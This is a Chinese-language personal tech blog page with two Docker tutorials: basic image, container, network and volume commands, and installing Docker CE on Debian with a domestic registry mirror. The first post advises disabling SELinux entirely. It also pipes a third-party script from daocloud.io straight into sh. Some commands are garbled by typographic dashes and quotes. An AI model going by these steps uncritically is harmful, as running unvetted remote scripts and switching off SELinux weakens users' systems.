    <article id="post-usage-of-docker" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/05/12/usage-of-docker/" class="article-date">
  <time datetime="2020-05-12T03:07:08.000Z" itemprop="datePublished">2020-05-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/docker/">docker</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/12/usage-of-docker/">usage-of-docker</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Docker-Hub-需要配置加速器"><a href="#Docker-Hub-需要配置加速器" class="headerlink" title="Docker Hub (需要配置加速器)"></a>Docker Hub (需要配置加速器)</h2><p>关闭 SELINUX 服务<br>SELINUX是CentOS系统捆绑的安全服务程序, 因为安全策略过于严格, 所以建议关闭这个服务<br>修改 /etc/selinux/config文件, 设置SELINUX=disabled<br>安装:<br>Centos: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install docker -y &#x2F;&#x2F;-y代表默认安装</span><br><span class="line">service docker start</span><br><span class="line">service docker stop</span><br><span class="line">service docker restart</span><br></pre></td></tr></table></figure>



<p>Debain:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure>



<p>CockerHub: 是Docker公共镜像库, 为用户提供了大量的镜像文件<br><a target="_blank" rel="noopener" href="https://hub.docker.com/">https://hub.docker.com/</a><br>由于国内网络访问DockerHub很慢, 无法下载镜像文件,我们可以使用Docker加速器</p>
<p>网易镜像中心：<a target="_blank" rel="noopener" href="https://c.163.com/hub#/m/home/">https://c.163.com/hub#/m/home/</a><br>docker pull hub.c.163.com/library/tomcat:latest</p>
<p>docker 中科大源: <a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/wiki/mirrors/help/docker">https://lug.ustc.edu.cn/wiki/mirrors/help/docker</a></p>
<p>安装加速器:<br>curl -sSl <a target="_blank" rel="noopener" href="https://get.daocloud.io/daotools/set_mirror.sh">https://get.daocloud.io/daotools/set_mirror.sh</a> | sh -s <a target="_blank" rel="noopener" href="http://f1361db2.m.daocloud.io/">http://f1361db2.m.daocloud.io</a><br>//启动加速器<br>./acc.sh {“registry-mirrors”: [“<a href="http://f1361db2.m.daocloud.io&quot;]}">http://f1361db2.m.daocloud.io&quot;]}</a></p>
<p>修改Docker配置文件,去掉逗号<br>vim /etc/docker/daemon.json<br>{“registry-mirrors”: [“<a href="http://f1361db2.m.daocloud.io&quot;]}">http://f1361db2.m.daocloud.io&quot;]}</a></p>
<h3 id="安装python镜像"><a href="#安装python镜像" class="headerlink" title="安装python镜像:"></a>安装python镜像:</h3><p>docker pull python:3.8</p>
<h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像:"></a>查看镜像:</h3><p>docker images</p>
<h3 id="查看镜像的详细信息"><a href="#查看镜像的详细信息" class="headerlink" title="查看镜像的详细信息:"></a>查看镜像的详细信息:</h3><p>docker inspect python:3.8</p>
<h3 id="将镜像导出"><a href="#将镜像导出" class="headerlink" title="将镜像导出"></a>将镜像导出</h3><p>docker save python:3.8 &gt; /root/python.tar</p>
<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><p>docker rmi python:3.8</p>
<h3 id="导入镜像"><a href="#导入镜像" class="headerlink" title="导入镜像"></a>导入镜像</h3><p>docker load &lt; /root/python.tar</p>
<h3 id="创建docker容器"><a href="#创建docker容器" class="headerlink" title="创建docker容器:"></a>创建docker容器:</h3><p>it代表创建一个容器, 后面需要交互, bash交互<br>docker run -it –name=p1 python:3.8 bash</p>
<h3 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h3><p>docker ps -a</p>
<h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>容器名为p1<br>docker start p1</p>
<h3 id="暂停容器"><a href="#暂停容器" class="headerlink" title="暂停容器:"></a>暂停容器:</h3><p>docker pause p1</p>
<h3 id="取消暂停容器"><a href="#取消暂停容器" class="headerlink" title="取消暂停容器:"></a>取消暂停容器:</h3><p>docker unpause p1</p>
<h3 id="使用bash进入p1容器"><a href="#使用bash进入p1容器" class="headerlink" title="使用bash进入p1容器"></a>使用bash进入p1容器</h3><p>docker exec -it p1 bash</p>
<h3 id="查看容器详细信息"><a href="#查看容器详细信息" class="headerlink" title="查看容器详细信息"></a>查看容器详细信息</h3><p>docker inspect p1</p>
<h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><p>docker stop p1</p>
<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><p>必须先停止容器<br>docker rm p1</p>
<h3 id="Docker-网络"><a href="#Docker-网络" class="headerlink" title="Docker 网络"></a>Docker 网络</h3><p>是Docket内的内部网络</p>
<p>默认情况下, Docker环境会给容器分配动态的IP地址,这就导致下次启动容器的时候,IP地址就变了<br>可以单独创建Docker内部的网段(172.18.0.x)<br>172.18.0.0/16 表示网络码占16位，也就是说该网络上可以有65534个主机(2^16-2)IP范 围：172.18.0.1~172.18.255.254 172.18.255.255是广播地址，不能被主机使用.设置IP地址的时候：172.18.x.y 子网掩码：255.255.0.0<br>mynet 是自定义名字</p>
<p>docker network create –subnet=172.18.0.0/16 docker_net</p>
<h3 id="解除容器绑定的网络-网络名词docker-net-容器名称-test"><a href="#解除容器绑定的网络-网络名词docker-net-容器名称-test" class="headerlink" title="解除容器绑定的网络 网络名词docker_net 容器名称 test"></a>解除容器绑定的网络 网络名词docker_net 容器名称 test</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network disconnect docker_net test</span><br></pre></td></tr></table></figure>

<h3 id="删除原先的网络"><a href="#删除原先的网络" class="headerlink" title="删除原先的网络"></a>删除原先的网络</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network rm docker_net</span><br></pre></td></tr></table></figure>

<h3 id="创建新的网络"><a href="#创建新的网络" class="headerlink" title="创建新的网络"></a>创建新的网络</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network create --subnet&#x3D;192.168.222.0&#x2F;24 mynetwork</span><br></pre></td></tr></table></figure>

<h2 id="连接新的网络"><a href="#连接新的网络" class="headerlink" title="连接新的网络"></a>连接新的网络</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network connect mynetwork test </span><br></pre></td></tr></table></figure>

<h3 id="重新启动容器"><a href="#重新启动容器" class="headerlink" title="重新启动容器"></a>重新启动容器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker container restart test</span><br></pre></td></tr></table></figure>

<h4 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h4><p>删除某个网段, 删除网段之前, 必须先删除容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network rm mynet</span><br></pre></td></tr></table></figure>

<p>创建容器并指定ip, 而 172.18.0.1是网关地址, 是不能使用的<br>docker run -it –net mynet –ip 172.18.0.2 python:3.8 bash</p>
<h4 id="查看网段"><a href="#查看网段" class="headerlink" title="查看网段"></a>查看网段</h4><p>docker network ls</p>
<h4 id="删除mynet网段"><a href="#删除mynet网段" class="headerlink" title="删除mynet网段"></a>删除mynet网段</h4><p>docker network rm mynet</p>
<h4 id="指定某个ip创建容器"><a href="#指定某个ip创建容器" class="headerlink" title="指定某个ip创建容器"></a>指定某个ip创建容器</h4><p>docker run -it –name=p1 –net mynet –ip 172.18.0.2 python:3.8 bash</p>
<h4 id="容器端口映射"><a href="#容器端口映射" class="headerlink" title="容器端口映射"></a>容器端口映射</h4><p>默认情况下, 除了宿主机之外,任何主机无法访问远程Docker容器<br>通过端口映射,可以吧容器端口映射到宿主机的端口,这样其他主机就能访问了<br>映射到宿主机的端口,不需要设置防火墙规则,便可以使用<br>将容器的5000端口映射到宿主机的9500端口<br>docker run -it -p 9500:5000 python:3.8 bash</p>
<h4 id="映射多个端口"><a href="#映射多个端口" class="headerlink" title="映射多个端口"></a>映射多个端口</h4><p>docker run -it -p 9500:5000 -p 9600:3306 python:3.8 bash</p>
<h3 id="目录挂载在技术"><a href="#目录挂载在技术" class="headerlink" title="目录挂载在技术"></a>目录挂载在技术</h3><p>为了能把一部分业务数据保存在Docker环境之外,或者把宿主机的文件传入容器,所以<br>需要给容器挂载宿主机的目录<br>Docker环境只支持目录挂载,不支持文件挂载, 且一个容器可以挂载多个目录</p>
<p>将宿主机的/root/test目录挂载到容器的/root/project 目录中<br>docker run -it -v /root/test:/root/project –name=p1 python:3.8 bash</p>
<h2 id="给docker添加用户组"><a href="#给docker添加用户组" class="headerlink" title="给docker添加用户组"></a>给docker添加用户组</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd docker    <span class="comment">#添加docker用户组</span></span><br><span class="line">sudo gpasswd -a <span class="variable">$USER</span> docker <span class="comment">#将登陆用户加入到docker用户组中</span></span><br><span class="line">newgrp docker <span class="comment">#更新用户组</span></span><br><span class="line">docker ps     <span class="comment">#测试docker命令是否可以使用sudo正常使用</span></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/05/12/usage-of-docker/" data-id="ckhemv815001lwdcmbniadwdd" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/docker/" rel="tag">docker</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-install-docker-on-debian" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/05/12/install-docker-on-debian/" class="article-date">
  <time datetime="2020-05-12T03:04:29.000Z" itemprop="datePublished">2020-05-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/docker/">docker</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/12/install-docker-on-debian/">install-docker-on-debian</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Debian-安装-docker"><a href="#Debian-安装-docker" class="headerlink" title="Debian 安装 docker"></a>Debian 安装 docker</h1><h2 id="卸载旧版"><a href="#卸载旧版" class="headerlink" title="卸载旧版"></a>卸载旧版</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>

<h2 id="设置仓库"><a href="#设置仓库" class="headerlink" title="设置仓库"></a>设置仓库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure>




<h1 id="安装-apt-依赖包"><a href="#安装-apt-依赖包" class="headerlink" title="安装 apt 依赖包"></a>安装 apt 依赖包</h1><p>用于通过 HTTPS 来获取仓库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">   apt-transport-https \</span><br><span class="line">   ca-certificates \</span><br><span class="line">   curl \</span><br><span class="line">   gnupg2 \</span><br><span class="line">   software-properties-common</span><br></pre></td></tr></table></figure>



<h1 id="添加-Docker-的官方-GPG-密钥"><a href="#添加-Docker-的官方-GPG-密钥" class="headerlink" title="添加 Docker 的官方 GPG 密钥"></a>添加 Docker 的官方 GPG 密钥</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>

<p>9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后8个字符，验证您现在是否拥有带有指纹的密钥</p>
<p>查看密匙 (9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后8个字符，验证您现在是否拥有带有指纹的密钥)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key fingerprint 0EBFCD88</span><br></pre></td></tr></table></figure>

<p>输出:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pub   4096R&#x2F;0EBFCD88 2017-02-22</span><br><span class="line">      Key fingerprint &#x3D; 9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88</span><br><span class="line">uid                  Docker Release (CE deb) &lt;docker@docker.com&gt;</span><br><span class="line">sub   4096R&#x2F;F273FCD8 2017-02-22</span><br></pre></td></tr></table></figure>

<h2 id="使用以下指令设置稳定版仓库"><a href="#使用以下指令设置稳定版仓库" class="headerlink" title="使用以下指令设置稳定版仓库"></a>使用以下指令设置稳定版仓库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">  &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian \</span><br><span class="line">  $(lsb_release -cs) \</span><br><span class="line">  stable&quot;</span><br></pre></td></tr></table></figure>

<h2 id="安装-Docker-Engine-Community"><a href="#安装-Docker-Engine-Community" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>

<p>安装最新版本的 Docker Engine-Community 和 containerd ，或者转到下一步安装特定版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>


<p>要安装特定版本的 Docker Engine-Community 请在仓库中列出可用版本,然后选择一种安装,列出您的仓库中可用的版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-cache madison docker-ce</span><br></pre></td></tr></table></figure>

<p>使用第二列中的版本字符串安装特定版本，例如 5:18.09.1<del>3-0</del>debian-stretch</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce&#x3D;&lt;VERSION_STRING&gt; docker-ce-cli&#x3D;&lt;VERSION_STRING&gt; containerd.io</span><br></pre></td></tr></table></figure>



<h2 id="测试-Docker-是否安装成功"><a href="#测试-Docker-是否安装成功" class="headerlink" title="测试 Docker 是否安装成功"></a>测试 Docker 是否安装成功</h2><p>输入以下指令，打印出以下信息则安装成功：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>



<h2 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h2><h3 id="配置用户"><a href="#配置用户" class="headerlink" title="配置用户"></a>配置用户</h3><p>默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯, 而只有 root 用户和 docker 组的用户才可以访问 </p>
<p>Docker 引擎的 Unix socket 出于安全考虑，一般 Linux 系统上不会直接使用 root 用户 因此，可将需要使用 docker 的用户加入 docker 用户组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -aG docker $&#123;USER&#125;</span><br></pre></td></tr></table></figure>



<h3 id="应用新的组成员身份"><a href="#应用新的组成员身份" class="headerlink" title="应用新的组成员身份"></a>应用新的组成员身份</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - $&#123;USER&#125;</span><br></pre></td></tr></table></figure>

<h3 id="配置国内镜像"><a href="#配置国内镜像" class="headerlink" title="配置国内镜像"></a>配置国内镜像</h3><p>鉴于国内网络问题，后续拉取 Docker 镜像十分缓慢，我们可以需要配置加速器来解决，我使用的是网易的镜像地址：<a target="_blank" rel="noopener" href="http://hub-mirror.c.163.com/">http://hub-mirror.c.163.com</a><br>新版的 Docker 使用 /etc/docker/daemon.json来配置 Daemon<br>请在该配置文件中加入（没有该文件的话，请先建一个）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;registry-mirrors&quot;: [</span><br><span class="line">		&quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重启docker</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/05/12/install-docker-on-debian/" data-id="ckhemv7zs000bwdcm5g6udl0k" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/docker/" rel="tag">docker</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/5/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/dev/">dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vul/">vul</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vul/" rel="tag">vul</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/android/" style="font-size: 12.5px;">android</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/dev/" style="font-size: 10px;">dev</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/golang/" style="font-size: 10px;">golang</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/kernel/" style="font-size: 12.5px;">kernel</a> <a href="/tags/life/" style="font-size: 15px;">life</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/pwn-env/" style="font-size: 10px;">pwn-env</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/vul/" style="font-size: 10px;">vul</a> <a href="/tags/weekly-summary/" style="font-size: 12.5px;">weekly summary</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/08/wp-other/">wp-thb-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
          </li>
        
          <li>
            <a href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 i0gan<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>